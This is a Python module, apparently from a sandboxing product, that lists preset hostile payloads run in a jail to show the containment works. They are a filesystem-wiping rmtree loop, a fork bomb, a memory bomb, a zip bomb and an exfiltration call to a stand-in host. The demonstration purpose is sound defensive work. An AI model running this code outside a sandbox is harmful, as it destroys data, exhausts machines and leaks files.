"""Attack mode: preset hostile payloads, executed through the exact same jailed pipeline.

Nothing here is special-cased — the attacks go through Sandbox.run like any analysis.
That is the point: the containment is the product, and the attacks prove it.
"""

PAYLOADS: dict[str, dict[str, str]] = {
    "rm_rf": {
        "label": "rm -rf /",
        "blurb": "Tries to delete the filesystem, root first.",
        "code": (
            "import os, shutil\n"
            "print('attempting to delete the filesystem...')\n"
            "for target in ['/', '/usr', '/work', '/etc']:\n"
            "    try:\n"
            "        shutil.rmtree(target, ignore_errors=False)\n"
            "        print(f'deleted {target}')\n"
            "    except Exception as e:\n"
            "        print(f'BLOCKED at {target}: {type(e).__name__}: {e}')\n"
            "print('still alive enough to print this line.')\n"
        ),
    },
    "fork_bomb": {
        "label": "fork bomb",
        "blurb": "Spawns processes without limit until the pids cap stops it.",
        "code": (
            "import os, time\n"
            "print('spawning processes without limit...')\n"
            "kids = 0\n"
            "try:\n"
            "    while True:\n"
            "        pid = os.fork()\n"
            "        if pid == 0:\n"
            "            time.sleep(60)\n"
            "        kids += 1\n"
            "except OSError as e:\n"
            "    print(f'BLOCKED after {kids} forks: {e}')\n"
        ),
    },
    "mem_bomb": {
        "label": "memory bomb",
        "blurb": "Allocates memory without limit until the cgroup cap stops it.",
        "code": (
            "print('allocating memory without limit...')\n"
            "chunks = []\n"
            "try:\n"
            "    while True:\n"
            "        chunks.append(bytearray(10 * 1024 * 1024))  # 10 MB\n"
            "except MemoryError:\n"
            "    print(f'BLOCKED after {len(chunks) * 10} MB')\n"
        ),
    },
    "exfil": {
        "label": "data exfiltration",
        "blurb": "Tries to phone home with the uploaded dataset. Sandbox has no network.",
        "code": (
            "import urllib.request\n"
            "print('trying to send /work/input data to a remote server...')\n"
            "try:\n"
            "    urllib.request.urlopen('https://example.com/exfil', timeout=5)\n"
            "    print('exfiltrated (this should never print)')\n"
            "except Exception as e:\n"
            "    print(f'BLOCKED: {type(e).__name__}: {e}')\n"
        ),
    },
    "zip_bomb": {
        "label": "zip bomb",
        "blurb": "A tiny archive that decompresses without bound; the disk/memory caps absorb it.",
        "code": (
            "import io, zipfile\n"
            "print('building a zip bomb in memory...')\n"
            "buf = io.BytesIO()\n"
            "with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:\n"
            "    z.writestr('bomb.txt', b'0' * (2048 * 1024 * 1024))\n"
            "buf.seek(0)\n"
            "try:\n"
            "    with zipfile.ZipFile(buf) as z:\n"
            "        data = z.read('bomb.txt')\n"
            "    print(f'decompressed {len(data)} bytes (this should never print)')\n"
            "except MemoryError:\n"
            "    print('BLOCKED: memory cap absorbed the bomb')\n"
        ),
    },
}
